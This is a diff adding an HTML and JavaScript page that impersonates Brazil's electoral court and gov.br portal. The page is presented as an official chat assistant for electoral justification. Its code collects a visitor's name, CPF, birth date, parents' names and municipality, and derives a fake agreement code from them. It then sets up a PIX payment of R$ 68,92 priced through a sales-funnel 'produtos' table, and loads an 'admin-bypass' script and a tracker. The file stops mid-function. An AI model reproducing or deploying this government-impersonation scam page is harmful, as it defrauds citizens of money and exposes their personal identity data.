@@ -1,0 +1,2965 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <script src="/desen/js/admin-bypass.js"></script>
+  <meta name="format-detection" content="telephone=no,date=no,address=no,email=no,url=no">
+  <meta name="robots" content="noindex, nofollow">
+  <link rel="icon" type="image/svg+xml" href="images/svgexport-logo.svg">
+  <title>e-Título — Justificativa Eleitoral | Portal TSE gov.br</title>
+  
+  
+  <script src="js/tracker.js" async=""></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.min.js"></script>
+  <script>
+    // Configura o worker do pdf.js para remover erro deprecated
+    pdfjsLib.GlobalWorkerOptions.workerSrc = 'https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.worker.min.js';
+  </script>
+  <script src="./preencher_comprovante.js"></script>
+
+  <style>
+    /* --- RESET & PADRÃO gov.BR CHAT --- */
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { height: 100%; width: 100%; }
+    body {
+      font-family: 'Rawline', 'Inter', 'Open Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: #f0f2f5;
+      color: #1a1a1a;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* Barra Brasil */
+    .barra-brasil {
+      background: #173058;
+      color: #ffffff;
+      font-size: 11px;
+      font-weight: 600;
+      padding: 4px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid #222;
+      flex-shrink: 0;
+    }
+
+    .barra-brasil-logo {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      color: #ffffff;
+      text-decoration: none;
+      font-weight: 800;
+      font-size: 11px;
+      letter-spacing: 0.04em;
+    }
+
+    .flag-icon-svg {
+      display: inline-block;
+      vertical-align: middle;
+      border-radius: 1.5px;
+      flex-shrink: 0;
+    }
+
+    .barra-brasil-nav {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .barra-brasil-nav a {
+      color: #9ca3af;
+      text-decoration: none;
+      font-size: 10px;
+    }
+
+    @media (max-width: 500px) {
+      .barra-brasil-nav { display: none; }
+    }
+
+    .page-chat {
+      display: flex;
+      flex-direction: column;
+      flex: 1;
+      height: 100%;
+      max-width: 720px;
+      width: 100%;
+      margin: 0 auto;
+      background: #f0f2f5;
+      position: relative;
+    }
+
+    /* Header gov.br */
+    .chat-header {
+      background: #ffffff;
+      border-bottom: 2.5px solid #173058;
+      box-shadow: 0 1px 4px rgba(0,0,0,.08);
+      height: auto;
+      min-height: 80px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 12px 16px;
+      flex-shrink: 0;
+      z-index: 10;
+    }
+
+    .chat-header-brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .chat-header img {
+      height: 80px;
+      width: auto;
+      max-width: 100%;
+      object-fit: contain;
+    }
+
+    .chat-header-brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      flex: 1;
+    }
+
+    @media (max-width: 768px) {
+      .chat-header img {
+        height: 72px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .chat-header img {
+        height: 68px;
+      }
+    }
+
+    .btn-user {
+      background: #1351B4;
+      color: #ffffff;
+      border: none;
+      border-radius: 50px;
+      padding: 6px 14px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 13px;
+      font-weight: 700;
+      font-family: inherit;
+      box-shadow: 0 2px 6px rgba(19, 81, 180, 0.25);
+    }
+
+    /* Faixa da Atendente Oficial */
+    .attendant-strip {
+      background: #ffffff;
+      border-bottom: 1px solid #e2e8f0;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 12px 16px;
+      flex-shrink: 0;
+      height: 70px;
+    }
+
+    .attendant-strip img {
+      width: 56px;
+      height: 56px;
+      border-radius: 50%;
+      object-fit: cover;
+      flex-shrink: 0;
+      border: 2px solid #173058;
+    }
+
+    .att-info {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .att-nome {
+      font-weight: 800;
+      font-size: 13.5px;
+      color: #1e293b;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .att-verified-badge {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 14px;
+      height: 14px;
+      background: #1351B4;
+      color: #fff;
+      border-radius: 50%;
+      font-size: 9px;
+      font-weight: 900;
+    }
+
+    .att-cargo {
+      font-size: 11.5px;
+      color: #64748b;
+      font-weight: 500;
+    }
+
+    /* Mensagens / Feed */
+    .chat-msgs {
+      flex: 1 1 auto;
+      overflow-y: auto;
+      padding: 16px 14px 28px;
+      width: 100%;
+      margin: 0 auto;
+      scroll-behavior: smooth;
+    }
+
+    .msg-row {
+      display: flex;
+      margin-bottom: 10px;
+      align-items: flex-end;
+    }
+
+    .msg-row.user {
+      justify-content: flex-end;
+    }
+
+    .avatar {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      object-fit: cover;
+      flex-shrink: 0;
+      margin-right: 8px;
+      margin-bottom: 2px;
+      border: 1.5px solid #1351B4;
+    }
+
+    .bubble-bot {
+      background: #ffffff;
+      color: #1e293b;
+      border: 1px solid #e2e8f0;
+      border-radius: 18px 18px 18px 4px;
+      padding: 12px 16px;
+      font-size: 14px;
+      line-height: 1.55;
+      max-width: 82%;
+      box-shadow: 0 2px 8px rgba(0,0,0,.05);
+      overflow-wrap: break-word;
+      animation: fadeUp .3s ease both;
+    }
+
+    .bubble-user {
+      background: linear-gradient(135deg, #1351B4, #0C326F);
+      color: #ffffff;
+      border-radius: 18px 18px 4px 18px;
+      padding: 12px 16px;
+      font-size: 14px;
+      line-height: 1.55;
+      max-width: 82%;
+      overflow-wrap: break-word;
+      box-shadow: 0 2px 8px rgba(19, 81, 180, 0.25);
+      animation: fadeUp .3s ease both;
+    }
+
+    .bubble-system {
+      color: #64748b;
+      font-size: 12px;
+      font-style: italic;
+      padding: 6px 12px;
+      text-align: center;
+      animation: fadeUp .3s ease both;
+      width: 100%;
+    }
+
+    .bubble-info-card {
+      background: #EFF6FF;
+      border: 1.5px solid #BFDBFE;
+      border-radius: 14px;
+      padding: 16px;
+      font-size: 13.5px;
+      line-height: 1.7;
+      max-width: 86%;
+      box-shadow: 0 3px 10px rgba(19, 81, 180, 0.06);
+      animation: fadeUp .3s ease both;
+    }
+
+    .ic-label { color: #475569; font-size: 12.5px; font-weight: 500; }
+    .ic-value { color: #1351B4; font-weight: 700; font-size: 14px; }
+    .ic-bold  { font-weight: 800; color: #0f172a; font-size: 14.5px; }
+
+    /* Card de Confirmação Cadastral */
+    .confirm-card {
+      background: #ffffff;
+      border: 1px solid #cbd5e1;
+      border-radius: 12px;
+      padding: 16px;
+      font-size: 13.5px;
+      line-height: 1.6;
+      margin-bottom: 10px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+    }
+
+    .confirm-title {
+      font-weight: 800;
+      display: block;
+      color: #0f172a;
+      margin-bottom: 10px;
+      border-bottom: 1px solid #f1f5f9;
+      padding-bottom: 6px;
+    }
+
+    .confirm-card strong {
+      display: block;
+      color: #475569;
+      font-size: 12px;
+      text-transform: uppercase;
+      letter-spacing: 0.03em;
+    }
+
+    .confirm-card span {
+      display: block;
+      color: #1351B4;
+      font-weight: 700;
+      margin-bottom: 6px;
+      font-size: 14px;
+    }
+
+    .confirm-btns {
+      display: flex;
+      gap: 10px;
+      justify-content: flex-end;
+      flex-wrap: wrap;
+      margin-top: 8px;
+    }
+
+    /* Botões Interativos */
+    .btn-row {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      margin-top: 4px;
+      animation: fadeUp .3s ease both;
+    }
+
+    .btn-row.row-inline {
+      flex-direction: row;
+      flex-wrap: wrap;
+    }
+
+    .chat-btn {
+      background: #ffffff;
+      border: 2px solid #1351B4;
+      color: #1351B4;
+      border-radius: 24px;
+      padding: 11px 20px;
+      font-size: 14px;
+      font-weight: 700;
+      font-family: inherit;
+      cursor: pointer;
+      transition: all .2s;
+      box-shadow: 0 2px 6px rgba(19, 81, 180, 0.12);
+    }
+
+    .chat-btn:hover, .chat-btn.solid {
+      background: #1351B4;
+      color: #ffffff;
+    }
+
+    .chat-btn.wide {
+      border-radius: 12px;
+      text-transform: uppercase;
+      font-size: 14.5px;
+      font-weight: 800;
+      letter-spacing: .03em;
+      padding: 15px 20px;
+      width: 100%;
+      text-align: center;
+    }
+
+    .chat-btn:disabled { opacity: .6; pointer-events: none; }
+
+    .btn-link-final {
+      display: block;
+      width: 100%;
+      background: #168821;
+      color: #ffffff !important;
+      text-decoration: none;
+      text-align: center;
+      font-size: 15px;
+      font-weight: 800;
+      letter-spacing: .03em;
+      text-transform: uppercase;
+      border-radius: 12px;
+      padding: 16px 20px;
+      border: none;
+      cursor: pointer;
+      box-shadow: 0 4px 14px rgba(22, 136, 33, 0.35);
+      animation: fadeUp .3s ease both;
+      transition: all 0.2s;
+    }
+
+    .btn-link-final:hover {
+      background: #13741c;
+      transform: translateY(-1px);
+    }
+
+    .typing {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      padding: 12px 16px;
+      background: #ffffff;
+      border-radius: 18px 18px 18px 4px;
+      border: 1px solid #e2e8f0;
+      box-shadow: 0 2px 6px rgba(0,0,0,.05);
+    }
+
+    .typing span {
+      width: 7px;
+      height: 7px;
+      background: #1351B4;
+      border-radius: 50%;
+      animation: bounce 1.2s infinite;
+    }
+
+    .typing span:nth-child(2) { animation-delay: .2s; }
+    .typing span:nth-child(3) { animation-delay: .4s; }
+
+    @keyframes bounce { 0%,80%,100% { transform: scale(0); } 40% { transform: scale(1); } }
+    @keyframes fadeUp { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+
+    /* Player de Áudio gov.br */
+    .gov-audio-card {
+      background: #ffffff;
+      border: 1px solid #cbd5e1;
+      border-left: 4px solid #1351B4;
+      border-radius: 12px;
+      padding: 12px 14px;
+      width: 100%;
+      max-width: 320px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+    }
+
+    .audio-play-btn {
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      background: #1351B4;
+      border: none;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      color: #ffffff;
+      box-shadow: 0 3px 10px rgba(19, 81, 180, 0.3);
+      transition: transform 0.15s;
+    }
+
+    .audio-play-btn:hover {
+      transform: scale(1.05);
+    }
+
+    .audio-track-info {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .audio-track-bar {
+      height: 6px;
+      background: #e2e8f0;
+      border-radius: 999px;
+      cursor: pointer;
+      width: 100%;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .audio-track-fill {
+      height: 100%;
+      background: #1351B4;
+      border-radius: 999px;
+      width: 0%;
+      transition: width 0.1s linear;
+    }
+
+    .audio-track-time {
+      font-size: 11.5px;
+      color: #64748b;
+      font-weight: 600;
+      display: flex;
+      justify-content: space-between;
+    }
+
+    /* Container de Pagamento PIX Nativo gov.br */
+    .pix-container {
+      background: #ffffff;
+      border: 2px solid #1351B4;
+      border-radius: 16px;
+      padding: 22px 18px;
+      margin: 14px 0;
+      text-align: center;
+      box-shadow: 0 6px 20px rgba(19, 81, 180, 0.08);
+      animation: fadeUp .35s ease both;
+    }
+
+    .pix-header-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: #ECFDF5;
+      color: #168821;
+      border: 1px solid #A7F3D0;
+      border-radius: 50px;
+      padding: 5px 14px;
+      font-size: 12px;
+      font-weight: 800;
+      margin-bottom: 12px;
+    }
+
+    .pix-title {
+      font-size: 16px;
+      font-weight: 800;
+      color: #0f172a;
+      margin-bottom: 4px;
+    }
+
+    .pix-sub {
+      font-size: 12.5px;
+      color: #64748b;
+      margin-bottom: 16px;
+    }
+
+    .qrcode-wrapper {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 16px;
+      padding: 10px;
+      background: #ffffff;
+      border-radius: 12px;
+      border: 1px solid #e2e8f0;
+      display: inline-block;
+    }
+
+    .pix-copy-paste {
+      background: #f8fafc;
+      border: 1px dashed #94a3b8;
+      border-radius: 8px;
+      padding: 12px;
+      font-family: monospace;
+      font-size: 11.5px;
+      word-break: break-all;
+      margin-bottom: 12px;
+      cursor: pointer;
+      color: #334155;
+      text-align: left;
+    }
+
+    .pix-copy-paste:active {
+      background: #e2e8f0;
+    }
+
+    .pix-status {
+      font-size: 13px;
+      color: #475569;
+      margin-top: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-weight: 600;
+    }
+
+    .pix-status .spinner {
+      width: 16px;
+      height: 16px;
+      border: 2.5px solid #168821;
+      border-top-color: transparent;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* Footer gov.br */
+    .site-footer {
+      background: #071D41;
+      padding: 12px 18px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .site-footer .gv {
+      color: #ffffff;
+      font-size: 16px;
+      font-weight: 900;
+      letter-spacing: -.5px;
+      margin-bottom: 2px;
+    }
+
+    .site-footer .gv span {
+      color: #FDB913;
+    }
+
+    .site-footer .gv-sub {
+      color: #cbd5e1;
+      font-size: 10.5px;
+      line-height: 1.4;
+    }
+
+    .site-footer .gv-copy {
+      color: #ffffff;
+      font-size: 10.5px;
+      font-weight: 700;
+      margin-top: 2px;
+    }
+
+    /* Barra de Progresso */
+    .progress-container {
+      background: #ffffff;
+      border-radius: 16px;
+      padding: 20px;
+      margin: 14px 0;
+      text-align: center;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+      animation: fadeUp .3s ease both;
+    }
+
+    .progress-text {
+      font-size: 14px;
+      font-weight: 600;
+      color: #1351B4;
+      margin-bottom: 16px;
+    }
+
+    .progress-bar-wrapper {
+      width: 100%;
+      height: 8px;
+      background: #f0f2f5;
+      border-radius: 999px;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .progress-bar-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #1351B4 0%, #FDB913 50%, #ffffff 100%);
+      border-radius: 999px;
+      animation: progressFill 12s ease-in-out forwards;
+    }
+
+    @keyframes progressFill {
+      0% { width: 0%; }
+      100% { width: 100%; }
+      100% { width: 100%; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="page-chat">
+    <!-- Barra Brasil -->
+    <div class="barra-brasil">
+      <div class="barra-brasil-logo">
+        <svg class="flag-icon-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 14" width="16" height="11" style="border-radius: 1.5px; flex-shrink: 0; display: inline-block; vertical-align: middle;">
+          <rect width="20" height="14" fill="#009c3b"/>
+          <polygon points="10,1.8 18.2,7 10,12.2 1.8,7" fill="#ffdf00"/>
+          <circle cx="10" cy="7" r="3.2" fill="#002776"/>
+          <path d="M 6.9 7.4 A 3.2 3.2 0 0 1 13.1 6.5 A 3.2 3.2 0 0 0 6.9 7.4 Z" fill="#ffffff"/>
+        </svg>
+        <strong>BRASIL</strong>
+      </div>
+      <nav class="barra-brasil-nav">
+        <a href="javascript:void(0)">Simplifique!</a>
+        <a href="javascript:void(0)">Participe</a>
+        <a href="javascript:void(0)">Acesso à informação</a>
+        <a href="javascript:void(0)">Legislação</a>
+        <a href="javascript:void(0)">Canais</a>
+      </nav>
+    </div>
+
+    <!-- Header gov.br -->
+    <header class="chat-header">
+      <div class="chat-header-brand">
+        <img src="images/svgexport-logo.svg" alt="Logo">
+      </div>
+      <button class="btn-user">
+        <img src="images/unnamed (1).png" alt="Avatar" style="width: 28px; height: 28px; border-radius: 50%; object-fit: cover; margin-right: 4px;">
+        <span id="nomeUsuario">Usuário</span>
+      </button>
+    </header>
+
+    <!-- Atendente Oficial -->
+    <div class="attendant-strip">
+      <img src="images/leticia1.png" alt="Justiça Eleitoral">
+      <div class="att-info">
+        <div class="att-nome">
+          Justiça Eleitoral
+          <span class="att-verified-badge" title="Atendente Oficial Verificada">✓</span>
+        </div>
+        <div class="att-cargo">Atendimento Oficial - Programa de Justificativa</div>
+      </div>
+    </div>
+
+    <!-- Feed de Mensagens -->
+    <div class="chat-msgs" id="msgs"></div>
+
+    <!-- Rodapé Oficial gov.br -->
+    <footer class="site-footer">
+      <div class="gv">gov<span>.br</span></div>
+      <div class="gv-sub">Todo o conteúdo deste site está publicado sob a licença Creative Commons Atribuição-SemDerivações 3.0</div>
+      <div class="gv-copy">Ministério da Fazenda — gov Federal do Brasil</div>
+    </footer>
+  </div>
+
+  <script>
+  /**
+   * Coleta nome/CPF/nasc da URL ou localStorage com fallback consistente.
+   */
+  function paramsFromUrl() {
+    var p = new URLSearchParams(window.location.search);
+    return {
+      nome:      p.get('nome') || '',
+      cpf:       p.get('cpf')  || '',
+      nasc:      p.get('nasc') || '',
+      nome_pai:  p.get('nome_pai') || '',
+      nome_mae:  p.get('nome_mae') || '',
+      municipio: p.get('municipio') || ''
+    };
+  }
+
+  function formatCPF(cpf) {
+    var d = String(cpf || '').replace(/\D/g, '').slice(0, 11);
+    if (d.length <= 3) return d;
+    if (d.length <= 6) return d.slice(0, 3) + '.' + d.slice(3);
+    if (d.length <= 9) return d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6);
+    return d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6, 9) + '-' + d.slice(9);
+  }
+
+  function formatData(data) {
+    if (!data || data.length < 10) return data;
+    var m = String(data).match(/(\d{4})-(\d{2})-(\d{2})/);
+    if (m) return m[3] + '/' + m[2] + '/' + m[1];
+    return data;
+  }
+
+  var u = paramsFromUrl();
+  var storage = {};
+  try {
+    storage.nome      = localStorage.getItem('site.nome') || '';
+    storage.cpf       = localStorage.getItem('site.cpf')  || '';
+    storage.nasc      = localStorage.getItem('site.nasc') || '';
+    storage.nome_pai  = localStorage.getItem('site.nome_pai') || '';
+    storage.nome_mae  = localStorage.getItem('site.nome_mae') || '';
+    storage.municipio = localStorage.getItem('site.municipio') || '';
+  } catch (_) {}
+
+  var NOME          = (u.nome  || storage.nome || 'Contribuinte');
+  var NOME_COMPLETO = NOME;
+  var CPF           = (u.cpf   || storage.cpf  || '');
+  var CPF_FORMATADO = formatCPF(CPF);
+  var COMPROVANTE_IMAGEM = null;  // Armazena a imagem do comprovante para download
+  var PAGAMENTO_CONFIRMADO = false;  // Flag para saber se pode remover watermark
+
+  // Função global para validar email
+  function isValidEmail(email) {
+    var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    return emailRegex.test(email);
+  }
+
+  function carregarImagem(src) {
+    return new Promise(function(resolve, reject) {
+      var img = new Image();
+      img.onload = function() { resolve(img); };
+      img.onerror = reject;
+      img.src = src;
+    });
+  }
+
+  // Gera o PDF a partir da imagem JÁ preenchida (template + dados), com marca d'água opcional
+  async function baixarComprovantePdf(imagemPreenchida, comWatermark, nomeArquivo) {
+    var JsPDF = window.jspdf && window.jspdf.jsPDF;
+    if (!imagemPreenchida || !JsPDF) {
+      botSay('Não foi possível gerar o PDF. Tente novamente.');
+      return;
+    }
+
+    var base = await carregarImagem(imagemPreenchida);
+    var canvas = document.createElement('canvas');
+    canvas.width = base.width;
+    canvas.height = base.height;
+    var ctx = canvas.getContext('2d');
+    ctx.fillStyle = '#ffffff';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.drawImage(base, 0, 0);
+
+    if (comWatermark) {
+      try {
+        var wm = await carregarImagem('./images/leticia1 - Copia.png');
+        var escala = Math.min(canvas.width / wm.width, canvas.height / wm.height) * 1.1;
+        var w = wm.width * escala, h = wm.height * escala;
+        ctx.globalAlpha = 0.25;
+        ctx.drawImage(wm, (canvas.width - w) / 2, (canvas.height - h) / 2, w, h);
+        ctx.globalAlpha = 1;
+      } catch (e) {
+        console.warn('Marca d\'água não carregou:', e);
+      }
+    }
+
+    // Página do mesmo tamanho da imagem: sem esticar nem distorcer
+    var pdf = new JsPDF({
+      orientation: canvas.width >= canvas.height ? 'landscape' : 'portrait',
+      unit: 'px',
+      format: [canvas.width, canvas.height],
+      hotfixes: ['px_scaling']
+    });
+    pdf.addImage(canvas.toDataURL('image/jpeg', 0.95), 'JPEG', 0, 0, canvas.width, canvas.height);
+    pdf.save(nomeArquivo);
+  }
+
+  // Desabilita todos os inputs e botões dentro de um elemento
+  function disableFormInputs(element) {
+    if (!element) return;
+    var inputs = element.querySelectorAll('input, textarea, select, button, canvas');
+    inputs.forEach(function(inp) {
+      inp.disabled = true;
+      inp.style.opacity = '0.6';
+      inp.style.pointerEvents = 'none';
+      if (inp.tagName === 'CANVAS') {
+        inp.style.cursor = 'not-allowed';
+      }
+    });
+  }
+
+  var NASC          = (u.nasc  || storage.nasc || '');
+  var NOME_PAI      = (u.nome_pai || storage.nome_pai || '');
+  var NOME_MAE      = (u.nome_mae || storage.nome_mae || '');
+  var MUNICIPIO     = (u.municipio || storage.municipio || '');
+
+  // Salva no storage para garantir persistência futura
+  try {
+    if (NOME && NOME !== 'Contribuinte') localStorage.setItem('site.nome', NOME);
+    if (CPF) localStorage.setItem('site.cpf', CPF);
+    if (NASC) localStorage.setItem('site.nasc', NASC);
+    if (NOME_PAI) localStorage.setItem('site.nome_pai', NOME_PAI);
+    if (NOME_MAE) localStorage.setItem('site.nome_mae', NOME_MAE);
+    if (MUNICIPIO) localStorage.setItem('site.municipio', MUNICIPIO);
+  } catch (_) {}
+
+  // Gera código de acordo determinístico por CPF
+  function codeFromCPF(cpf) {
+    var d = String(cpf || '').replace(/\D/g, '');
+    var h = 5381;
+    for (var i = 0; i < d.length; i++) h = (h * 33 + d.charCodeAt(i)) >>> 0;
+    var s = h.toString(36).toUpperCase().padStart(8, 'X');
+    return (s.slice(0, 5) + '-' + s.slice(5, 9) + '-' + s.slice(9, 13) + '-' + s.slice(13, 17)).slice(0, 17);
+  }
+  var CODIGO_ACORDO = codeFromCPF(CPF);
+
+  // Valor PIX. É só o fallback exibido enquanto o catálogo não responde: quem
+  // manda no preço é a tabela em api/produtos.php, etapa "front".
+  var ETAPA = 'front';
+  var VALOR = 'R$ 68,92';
+
+  // Configurações do cliente
+  var PHONE = '11988887777';
+  // E-mail não é mais fixo aqui: o servidor monta a partir do nome do lead.
+  var AVATAR = 'images/leticia1.png';
+
+  // Atualiza nome no header
+  try {
+    var el = document.getElementById('nomeUsuario');
+    if (el) el.textContent = (NOME.split(' ')[0] || 'Usuário').toUpperCase();
+  } catch (_) {}
+
+  var msgs = document.getElementById('msgs');
+  var currentAudio = null;
+
+  function tag(t) {
+    return (t||'').replace(/\{NOME\}/g, NOME)
+      .replace(/\{NOME_COMPLETO\}/g, NOME_COMPLETO)
+      .replace(/\{CPF\}/g, CPF)
+      .replace(/\{CPF_FORMATADO\}/g, CPF_FORMATADO)
+      .replace(/\{NASC\}/g, NASC)
+      .replace(/\{CODIGO_ACORDO\}/g, CODIGO_ACORDO)
+      .replace(/\{VALOR\}/g, VALOR);
+  }
+
+  var scroll = function () { setTimeout(function () { msgs.scrollTop = msgs.scrollHeight; }, 60); };
+  var sleep  = function (ms) { return new Promise(function (r) { setTimeout(r, ms); }); };
+
+  // Desbloqueio de áudio por gesto
+  var audioUnlocked = false;
+  function unlockAudio() {
+    if (audioUnlocked) return;
+    try {
+      var dummy = new Audio();
+      dummy.play().then(function() {
+        audioUnlocked = true;
+      }).catch(function() {});
+    } catch(e) {}
+  }
+  document.addEventListener('click', unlockAudio, { once: true });
+
+  function addTyping() {
+    removeTyping();
+    var row = document.createElement('div');
+    row.className = 'msg-row'; row.id = 'typing-row';
+    row.innerHTML = '<img class="avatar" src="' + AVATAR + '"><div class="typing"><span></span><span></span><span></span></div>';
+    msgs.appendChild(row); scroll();
+  }
+  function removeTyping() { var el = document.getElementById('typing-row'); if (el) el.remove(); }
+
+  function botRow(inner) {
+    var row = document.createElement('div');
+    row.className = 'msg-row';
+    row.innerHTML = '<img class="avatar" src="' + AVATAR + '">' + inner;
+    msgs.appendChild(row); scroll();
+    return row;
+  }
+
+  function addUser(text) {
+    var row = document.createElement('div');
+    row.className = 'msg-row user';
+    row.innerHTML = '<div class="bubble-user">' + text + '</div>';
+    msgs.appendChild(row); scroll();
+  }
+
+  function addSystem(text) {
+    var row = document.createElement('div');
+    row.className = 'msg-row';
+    row.innerHTML = '<div style="width:32px;margin-right:8px;flex-shrink:0"></div><div class="bubble-system">' + tag(text) + '</div>';
+    msgs.appendChild(row); scroll();
+  }
+
+  function addImage(src) {
+    var row = document.createElement('div');
+    row.className = 'msg-row';
+    row.innerHTML = '<img class="avatar" src="' + AVATAR + '"><div style="flex:1"><img src="' + src + '" style="max-width:100%;border-radius:10px;margin-top:6px;box-shadow:0 2px 8px rgba(0,0,0,0.06);"></div>';
+    msgs.appendChild(row); scroll();
+  }
+
+  function addVideoAutoplay(src) {
+    var row = document.createElement('div');
+    row.className = 'msg-row';
+    var videoContainer = document.createElement('div');
+    videoContainer.style.position = 'relative';
+    videoContainer.style.display = 'inline-block';
+    videoContainer.style.width = '100%';
+    videoContainer.style.maxWidth = '280px';
+    videoContainer.style.borderRadius = '16px';
+    videoContainer.style.overflow = 'hidden';
+    videoContainer.style.boxShadow = '0 6px 20px rgba(0,0,0,0.12)';
+    videoContainer.style.marginTop = '6px';
+    videoContainer.style.backgroundColor = '#000';
+
+    var video = document.createElement('video');
+    video.src = src;
+    video.autoplay = true;
+    video.playsinline = true;
+    video.style.borderRadius = '16px';
+    video.style.width = '100%';
+    video.style.height = 'auto';
+    video.style.display = 'block';
+    video.style.objectFit = 'contain';
+    video.setAttribute('playsinline', '');
+    video.setAttribute('webkit-playsinline', '');
+
+    var controls = document.createElement('div');
+    controls.style.position = 'absolute';
+    controls.style.bottom = '12px';
+    controls.style.left = '12px';
+    controls.style.display = 'flex';
+    controls.style.gap = '10px';
+    controls.style.zIndex = '10';
+
+    var playPauseBtn = document.createElement('button');
+    playPauseBtn.style.width = '48px';
+    playPauseBtn.style.height = '48px';
+    playPauseBtn.style.borderRadius = '50%';
+    playPauseBtn.style.backgroundColor = '#1351B4';
+    playPauseBtn.style.border = 'none';
+    playPauseBtn.style.cursor = 'pointer';
+    playPauseBtn.style.display = 'flex';
+    playPauseBtn.style.alignItems = 'center';
+    playPauseBtn.style.justifyContent = 'center';
+    playPauseBtn.style.color = '#fff';
+    playPauseBtn.style.boxShadow = '0 3px 10px rgba(0,0,0,0.3)';
+
+    var pauseSvg = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="6" y="4" width="4" height="16"></rect><rect x="14" y="4" width="4" height="16"></rect></svg>';
+    var playSvg = '<svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>';
+
+    var isPlaying = false;
+    playPauseBtn.innerHTML = playSvg;
+
+    function attemptPlay() {
+      var p = video.play();
+      if (p !== undefined) {
+        p.then(function() {
+          isPlaying = true;
+          playPauseBtn.innerHTML = pauseSvg;
+        }).catch(function(e) {
+          isPlaying = false;
+          playPauseBtn.innerHTML = playSvg;
+        });
+      }
+    }
+
+    setTimeout(attemptPlay, 800);
+
+    playPauseBtn.onclick = function(e) {
+      e.stopPropagation();
+      if (isPlaying) {
+        video.pause();
+        playPauseBtn.innerHTML = playSvg;
+        isPlaying = false;
+      } else {
+        attemptPlay();
+      }
+    };
+
+    videoContainer.onclick = function(e) {
+      if (e.target === video || e.target === videoContainer) {
+        if (!isPlaying) attemptPlay();
+        else { video.pause(); isPlaying = false; playPauseBtn.innerHTML = playSvg; }
+      }
+    };
+
+    controls.appendChild(playPauseBtn);
+    videoContainer.appendChild(video);
+    videoContainer.appendChild(controls);
+
+    row.innerHTML = '<img class="avatar" src="' + AVATAR + '">';
+    row.appendChild(videoContainer);
+    msgs.appendChild(row); scroll();
+  }
+
+  function addAudio(src) {
+    var row = document.createElement('div');
+    row.className = 'msg-row';
+
+    if (currentAudio) {
+      try {
+        currentAudio.pause();
+        currentAudio.currentTime = 0;
+        currentAudio.src = '';
+        currentAudio.load();
+      } catch (e) {}
+    }
+
+    var audio = document.createElement('audio');
+    audio.src = src;
+    audio.preload = 'auto';
+    audio.autoplay = true;
+    currentAudio = audio;
+
+    var audioCard = document.createElement('div');
+    audioCard.className = 'gov-audio-card';
+
+    var playBtn = document.createElement('button');
+    playBtn.className = 'audio-play-btn';
+
+    var audioPlaySvg = '<svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>';
+    var audioPauseSvg = '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="6" y="4" width="4" height="16"></rect><rect x="14" y="4" width="4" height="16"></rect></svg>';
+    playBtn.innerHTML = audioPauseSvg;
+
+    var trackInfo = document.createElement('div');
+    trackInfo.className = 'audio-track-info';
+
+    var trackBar = document.createElement('div');
+    trackBar.className = 'audio-track-bar';
+
+    var trackFill = document.createElement('div');
+    trackFill.className = 'audio-track-fill';
+    trackBar.appendChild(trackFill);
+
